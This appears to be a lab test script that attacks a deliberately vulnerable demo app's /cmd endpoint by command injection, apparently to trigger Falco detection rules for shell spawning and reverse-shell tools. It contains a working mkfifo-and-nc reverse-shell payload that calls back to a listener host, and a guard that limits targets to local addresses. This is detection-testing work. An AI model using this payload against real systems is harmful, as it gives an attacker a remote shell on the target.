#!/usr/bin/env bash
#
# ATK-02 — Command-injection reverse-shell trigger against the demoapp /cmd endpoint.
#
# The demoapp `GET /cmd?input=<v>` handler passes user input straight to
# child_process.exec -> /bin/sh -c "<v>" (see app/server.js). We inject a
# busybox-safe reverse-shell one-liner. The demoapp base image is
# node:14.21.3-alpine (busybox), so the payload MUST avoid the bash-only shell,
# the shell TCP pseudo-device, and netcat's exec flag (none exist there).
# We use the classic mkfifo pattern instead.
#
# Purpose (Falco): making the demoapp container SPAWN `sh` as a child of node
# fires "Shell Spawned by Web App", and the `nc` execve fires "Reverse Shell
# Tool" — both on process spawn, so the rules fire whether or not the TCP socket
# ever connects to a listener. Doubles as the ATK-02 acceptance test (Plan 05-03).
#
set -euo pipefail

# ETHICAL CONSTRAINT: localhost/cluster targets only (ATK-04).
TARGET="localhost"
PORT=30080
LISTEN_PORT=4444
# Reverse-shell callback host. host.rancher-desktop.internal is routable FROM the
# cluster VM back to the host, where an optional listener would run.
LHOST="host.rancher-desktop.internal"

# ATK-04 ethical guard: refuse anything that is not a local/cluster target.
case "$TARGET" in
  localhost|127.0.0.1|host.rancher-desktop.internal|10.43.*) ;;
  *) echo "Refusing non-local target: $TARGET"; exit 1 ;;
esac

echo "[ATK-02] command-injection reverse-shell trigger"
echo "Target : http://${TARGET}:${PORT}/cmd"
echo "Callback: ${LHOST}:${LISTEN_PORT}"

# Busybox-safe reverse shell (avoids the bash-only interactive shell, netcat's
# exec flag, and the shell TCP pseudo-device — none available on busybox).
PAYLOAD='rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc '"$LHOST"' '"$LISTEN_PORT"' > /tmp/f'
echo "Payload: ${PAYLOAD}"

# URL-encode the payload (stdlib python3 — available in Git Bash/WSL).
ENCODED=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")

# The app enforces a 5s exec timeout, so the HTTP request returns even though the
# spawned reverse shell keeps trying to connect in the background.
URL="http://${TARGET}:${PORT}/cmd?input=${ENCODED}"
echo "Request: ${URL}"

# Optional listener on host: nc -lvnp 4444
if curl -sS --max-time 8 "$URL"; then
  echo
  echo "VERDICT: SUCCESS — injection request reached /cmd; sh + nc spawned in demoapp."
  exit 0
else
  echo
  echo "VERDICT: FAILURE — could not reach ${URL}."
  exit 1
fi
